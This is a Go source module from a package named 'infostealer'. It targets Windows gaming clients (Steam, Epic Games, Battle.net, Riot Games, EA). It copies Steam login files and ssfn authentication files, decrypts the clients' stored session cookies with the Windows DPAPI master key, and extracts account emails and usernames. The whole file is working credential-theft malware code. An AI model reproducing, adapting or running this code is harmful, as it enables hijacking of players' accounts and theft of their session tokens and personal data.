//go:build windows

package infostealer

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"github.com/andygrunwald/vdf"
	"golang.org/x/sys/windows"
	"gopkg.in/yaml.v3"
	_ "modernc.org/sqlite"
)

var supportedGamingPlatforms = []struct {
	Name string
	Path string
}{
	{"Steam", filepath.Join(os.Getenv("ProgramFiles(x86)"), "Steam")},
	{"Epic Games", filepath.Join(os.Getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved")},
	{"Battle.net", filepath.Join(os.Getenv("APPDATA"), "Battle.net")},
	{"Riot Games", filepath.Join(os.Getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data")},
	{"EA", filepath.Join(os.Getenv("LOCALAPPDATA"), "Electronic Arts", "EA Desktop", "CEF")},
}

func stealGamingCookies(dbpath string, key []byte) []cookie {
	fmt.Printf("[DEBUG] Starting stealGamingCookies for path: %s\n", dbpath)
	file, err := os.ReadFile(dbpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read cookie DB: %v\n", err)
		return nil
	}

	filename := filepath.Join(os.TempDir(), randomstring(10))
	err = os.WriteFile(filename, file, 0600)
	if err != nil {
		fmt.Printf("[ERROR] Failed to write temp cookie file: %v\n", err)
		return nil
	}
	fmt.Printf("[DEBUG] Created temp DB at: %s\n", filename)

	db, err := sql.Open("sqlite", "file:"+filename+"?mode=ro")
	if err != nil {
		fmt.Printf("[ERROR] Failed to open sqlite DB: %v\n", err)
		return nil
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		fmt.Printf("[ERROR] Query failed: %v\n", err)
		return nil
	}
	defer rows.Close()

	var cookies []cookie
	for rows.Next() {
		var (
			domain         string
			name           string
			encryptedvalue []byte
		)
		err = rows.Scan(&domain, &name, &encryptedvalue)
		if err != nil {
			fmt.Printf("[ERROR] Row scan failed: %v\n", err)
			continue
		}

		plaintext, err := decrypt(encryptedvalue[3:], key)
		if err != nil {
			fmt.Printf("[ERROR] DecryptV10 failed for %s: %v\n", name, err)
			continue
		}

		cookies = append(cookies, cookie{
			Domain: domain,
			Name:   name,
			Value:  plaintext,
		})
	}
	fmt.Printf("[DEBUG] Successfully recovered %d cookies\n", len(cookies))
	os.Remove(filename)
	return cookies
}

type steamuser struct {
	UserID      string
	AccountName string
	DisplayName string
	SSFNCheck   string
}

type SSFNFile struct {
	File     []byte
	Filename string
}

type steam struct {
	Users   []steamuser
	SSFNs   []SSFNFile
	FullVDF []byte
}

type epic struct {
	Cookies []cookie
	Key     []byte
}

type battlenetJson struct {
	Client struct {
		Email     string `json:"SavedAccountEmail"`
		Region    string `json:"LastLoginRegion"`
		AutoLogin string `json:"AutoLogin"`
	} `json:"Client"`
}

type battlenet struct {
	Cookies    []cookie
	Key        []byte
	ClientInfo battlenetJson
}

type riotYaml struct {
	Install struct {
		Globals struct {
			Region string `yaml:"region"`
		} `yaml:"globals"`

		OsCrypt struct {
			EncryptedKey string `yaml:"encrypted_key"`
		} `yaml:"os_crypt"`

		Login struct {
			Username string `yaml:"username"`
		} `yaml:"riot-login"`
	} `yaml:"install"`
}

type riot struct {
	Cookies []cookie
	Data    riotYaml
	Key     []byte
}

type ea struct {
	Cookies    []cookie
	LocalState localState
	Key        []byte
}

type gamingPlatform struct {
	Name          string
	Localpath     string
	SteamData     steam
	EpicData      epic
	BattleNetData battlenet
	RiotData      riot
	EAData        ea
}

func (platform *gamingPlatform) getSteam() {
	fmt.Printf("[DEBUG] Entering getSteam for path: %s\n", platform.Localpath)
	vdfPath := filepath.Join(platform.Localpath, "config", "loginusers.vdf")
	f, err := os.Open(vdfPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to open Steam VDF: %v\n", err)
	} else {
		platform.SteamData.FullVDF, err = os.ReadFile(vdfPath)
		parser := vdf.NewParser(f)
		vdfFile, err := parser.Parse()
		if err != nil {
			fmt.Printf("[ERROR] VDF Parse failed: %v\n", err)
		} else {
			if userdata, ok := vdfFile["users"].(map[string]interface{}); ok {
				for id, data := range userdata {
					if info, ok := data.(map[string]interface{}); ok {
						user := steamuser{
							UserID:      id,
							AccountName: info["AccountName"].(string),
							DisplayName: info["PersonaName"].(string),
							SSFNCheck:   info["RememberPassword"].(string),
						}
						platform.SteamData.Users = append(platform.SteamData.Users, user)
						fmt.Printf("[DEBUG] Found Steam User: %s\n", user.AccountName)
					}
				}
			}
		}
		f.Close()
	}

	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Steam dir: %v\n", err)
		return
	}
	for _, file := range files {
		name := file.Name()
		if !file.IsDir() && len(name) > 4 && name[:4] == "ssfn" {
			ssfnPath := filepath.Join(platform.Localpath, name)
			ssfn, err := os.ReadFile(ssfnPath)
			if err != nil {
				fmt.Printf("[ERROR] Failed to read SSFN %s: %v\n", name, err)
				continue
			}
			platform.SteamData.SSFNs = append(platform.SteamData.SSFNs, SSFNFile{
				File:     ssfn,
				Filename: name,
			})
			fmt.Printf("[DEBUG] Found SSFN File: %s\n", name)
		}
	}
}

func (platform *gamingPlatform) getEpic() {
	fmt.Printf("[DEBUG] Entering getEpic for path: %s\n", platform.Localpath)
	files, err := os.ReadDir(platform.Localpath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Epic dir: %v\n", err)
		return
	}
	var localstatepath string
	for _, file := range files {
		if file.IsDir() && len(file.Name()) > 8 && file.Name()[:8] == "webcache" {
			localstatepath = filepath.Join(platform.Localpath, file.Name(), "Local State")
			fmt.Printf("[DEBUG] Found Epic Local State at: %s\n", localstatepath)
			break
		}
	}
	statefile, err := os.ReadFile(localstatepath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Epic state file: %v\n", err)
		return
	}
	var state localState
	err = json.Unmarshal(statefile, &state)
	if err != nil {
		fmt.Printf("[ERROR] Epic JSON unmarshal failed: %v\n", err)
		return
	}
	decoded, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		fmt.Printf("[ERROR] Epic B64 decode failed: %v\n", err)
		return
	}

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		fmt.Printf("[ERROR] Epic CryptUnprotectData failed: %v\n", err)
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.EpicData.Key = key

	platform.EpicData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getBattlenet() {
	fmt.Printf("[DEBUG] Entering getBattlenet for path: %s\n", platform.Localpath)
	file, err := os.ReadFile(filepath.Join(platform.Localpath, "Local State"))
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Bnet state: %v\n", err)
		return
	}
	var state localState
	err = json.Unmarshal(file, &state)
	decoded, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		fmt.Printf("[ERROR] Bnet CryptUnprotectData failed: %v\n", err)
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.BattleNetData.Key = key

	platform.BattleNetData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)

	configPath := filepath.Join(platform.Localpath, "Battle.net.config")
	config, err := os.ReadFile(configPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Bnet config: %v\n", err)
	} else {
		var configjson battlenetJson
		err = json.Unmarshal(config, &configjson)
		if err != nil {
			fmt.Printf("[ERROR] Bnet config JSON parse failed: %v\n", err)
		}
		platform.BattleNetData.ClientInfo = configjson
		fmt.Printf("[DEBUG] Bnet Email: %s\n", configjson.Client.Email)
	}
}

func (platform *gamingPlatform) getRiot() {
	fmt.Printf("[DEBUG] Entering getRiot for path: %s\n", platform.Localpath)
	yamlPath := filepath.Join(platform.Localpath, "RiotClientPrivateSettings.yaml")
	file, err := os.ReadFile(yamlPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read Riot YAML: %v\n", err)
		return
	}
	err = yaml.Unmarshal(file, &platform.RiotData.Data)
	if err != nil {
		fmt.Printf("[ERROR] Riot YAML unmarshal failed: %v\n", err)
		return
	}
	decoded, err := base64.StdEncoding.DecodeString(platform.RiotData.Data.Install.OsCrypt.EncryptedKey)
	if err != nil {
		fmt.Printf("[ERROR] Riot B64 decode failed: %v\n", err)
		return
	}

	newkey := decoded[5:]
	var in = blob{cbData: uint32(len(newkey)), pbData: &newkey[0]}
	var out blob
	err = windows.CryptUnprotectData((*windows.DataBlob)(unsafe.Pointer(&in)), nil, nil, 0, nil, 0, (*windows.DataBlob)(unsafe.Pointer(&out)))
	if err != nil {
		fmt.Printf("[ERROR] Riot CryptUnprotectData failed: %v\n", err)
		return
	}
	decrypted := unsafe.Slice(out.pbData, out.cbData)
	key := make([]byte, len(decrypted))
	copy(key, decrypted)
	platform.RiotData.Key = key

	platform.RiotData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "Session Storage", "Cookies"), key)
}

func (platform *gamingPlatform) getEA() {
	fmt.Printf("[DEBUG] Entering getEA for path: %s\n", platform.Localpath)
	prefPath := filepath.Join(platform.Localpath, "LocalPrefs.json")
	file, err := os.ReadFile(prefPath)
	if err != nil {
		fmt.Printf("[ERROR] Failed to read EA Prefs: %v\n", err)
		return
	}
	err = json.Unmarshal(file, &platform.EAData.LocalState)
	if err != nil {
		fmt.Printf("[ERROR] EA JSON unmarshal failed: %v\n", err)
		return
	}
	platform.EAData.Key = platform.EAData.LocalState.decryptKey("", "", "v10")
	fmt.Printf("[DEBUG] EA Master Key Decrypted\n")
	platform.EAData.Cookies = stealGamingCookies(filepath.Join(platform.Localpath, "BrowserCache", "EADesktop", "Network", "Cookies"), platform.EAData.Key)
}

type GamingPlatforms []gamingPlatform

func (platforms *GamingPlatforms) populate() {
	for i, platform := range *platforms {
		fmt.Printf("[DEBUG] Populating platform: %s\n", platform.Name)
		switch platform.Name {
		case "Steam":
			(*platforms)[i].getSteam()
		case "Epic Games":
			(*platforms)[i].getEpic()
		case "Battle.net":
			(*platforms)[i].getBattlenet()
		case "Riot Games":
			(*platforms)[i].getRiot()
		case "EA":
			(*platforms)[i].getEA()
		}
	}
}

func detectGamingPlatforms() GamingPlatforms {
	fmt.Println("[DEBUG] Detecting gaming platforms...")
	var platforms GamingPlatforms
	for _, platform := range supportedGamingPlatforms {
		dir, err := os.Stat(platform.Path)
		if err != nil {
			fmt.Printf("[DEBUG] Platform %s not found (err: %v)\n", platform.Name, err)
			continue
		}
		if dir.IsDir() {
			fmt.Printf("[DEBUG] DETECTED: %s at %s\n", platform.Name, platform.Path)
			platforms = append(platforms, gamingPlatform{
				Name:      platform.Name,
				Localpath: platform.Path,
			})
		}
	}
	return platforms
}

func Gaming() GamingPlatforms {
	fmt.Println("[DEBUG] Starting Gaming Module...")
	platforms := detectGamingPlatforms()
	platforms.populate()
	fmt.Printf("[DEBUG] Gaming Module Finished. Found %d platforms.\n", len(platforms))
	return platforms
}
